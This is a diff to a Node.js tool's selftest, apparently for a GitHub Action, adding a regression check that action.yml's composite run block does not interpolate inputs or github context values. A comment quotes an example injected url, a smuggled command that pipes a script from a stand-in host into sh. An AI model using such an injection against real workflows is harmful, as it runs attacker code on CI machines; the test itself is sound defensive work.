@@ -9,6 +9,7 @@
 
 import { gunzipSync, gzipSync } from 'node:zlib';
 import net from 'node:net';
+import { existsSync, readFileSync } from 'node:fs';
 
 // Happy Eyeballs gives each address family only 250ms by default. On a machine with no
 // IPv6 route (most CI runners), a host whose IPv4 handshake takes longer than that —
@@ -1118,6 +1119,19 @@ async function selftest() {
   assert(parseSitemap(decodeBody(gzipSync(Buffer.from('<urlset><loc>https://a.com/x</loc></urlset>')),
     'application/gzip')).join() === 'https://a.com/x', 'gzipped sitemap is decompressed before parsing');
   assert(decodeBody(new TextEncoder().encode('plain'), 'text/html') === 'plain', 'non-gzip bodies untouched');
+
+  // action.yml ran user input through `${{ inputs.* }}` inside the composite `run:` block.
+  // The runner pastes those into the script text before bash parses it, so a url of
+  // `"; curl evil.sh | sh; "` executed. Inputs go through env now; keep it that way.
+  const actionYml = new URL('./action.yml', import.meta.url);
+  if (existsSync(actionYml)) {
+    const runBlock = readFileSync(actionYml, 'utf8').split(/^\s*run: \|/m)[1] || '';
+    assert(runBlock !== '', 'action.yml still has a composite run: block to check');
+    assert(!/\$\{\{\s*inputs\./.test(runBlock),
+      'action.yml run block interpolates an input — pass it through env: instead (shell injection)');
+    assert(!/\$\{\{\s*github\./.test(runBlock),
+      'action.yml run block interpolates a github context value — pass it through env: instead');
+  }
 
   console.log('selftest: all checks passed');
   return 0;
